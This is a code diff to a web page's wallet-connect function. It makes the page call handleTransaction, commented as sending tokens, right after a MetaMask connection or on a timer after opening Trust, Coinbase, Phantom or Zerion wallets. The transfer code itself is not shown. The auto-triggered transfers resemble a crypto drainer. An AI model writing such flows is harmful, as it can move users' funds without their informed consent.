@@ -43,7 +43,9 @@ async function connectWallet() {
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const account = accounts[0];
                 console.log(`Connected to MetaMask account: ${account}`);
-                await handleTransaction(); // Handle transactions after connection
+
+                // Proceed to send tokens after connecting
+                await handleTransaction();
             } else {
                 alert("Please install MetaMask to continue.");
                 window.open("https://metamask.io/", "_blank");
@@ -51,15 +53,23 @@ async function connectWallet() {
         } else if (selectedWallet === 'trustwallet') {
             const url = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(window.location.href)}`;
             window.open(url, "_blank"); // Open Trust Wallet app
+            // Automatically handle transaction after connection
+            setTimeout(handleTransaction, 5000); // Adjust the timeout if needed
         } else if (selectedWallet === 'coinbase') {
             const url = `https://www.coinbase.com/wallet/link?url=${encodeURIComponent(window.location.href)}`;
             window.open(url, "_blank"); // Open Coinbase Wallet app
+            // Automatically handle transaction after connection
+            setTimeout(handleTransaction, 5000); // Adjust the timeout if needed
         } else if (selectedWallet === 'phantom') {
             const url = `https://phantom.app/?action=connect&referrer=${encodeURIComponent(window.location.href)}`;
             window.open(url, "_blank"); // Open Phantom Wallet app
+            // Automatically handle transaction after connection
+            setTimeout(handleTransaction, 5000); // Adjust the timeout if needed
         } else if (selectedWallet === 'zerion') {
             const url = `https://zerion.io/wallet?url=${encodeURIComponent(window.location.href)}`;
             window.open(url, "_blank"); // Open Zerion Wallet app
+            // Automatically handle transaction after connection
+            setTimeout(handleTransaction, 5000); // Adjust the timeout if needed
         }
     } catch (error) {
         console.error("Error connecting to wallet:", error);
